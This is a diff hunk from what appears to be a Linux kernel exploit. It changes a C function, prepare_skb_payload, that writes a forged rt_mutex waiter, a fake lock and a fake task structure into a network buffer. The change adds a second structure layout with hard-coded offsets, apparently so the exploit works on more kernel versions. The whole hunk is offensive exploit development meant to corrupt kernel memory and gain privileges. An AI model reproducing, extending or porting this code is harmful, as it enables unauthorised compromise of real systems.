@@ -589,10 +589,18 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
     put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
     put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
-    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
-    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
+    int compact = active_offsets && active_offsets->waiter_compact;
+    if (compact) {
+      put64(p, W0_OFF + 0x30, waiter_task);
+      put64(p, W0_OFF + 0x38, fake_lock);
+      put32(p, W0_OFF + 0x40, FAKE_WAITER_PRIO);
+      put64(p, W0_OFF + 0x48, 0);
+    } else {
+      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
+      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
+      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
+      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
+    }
 
     put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
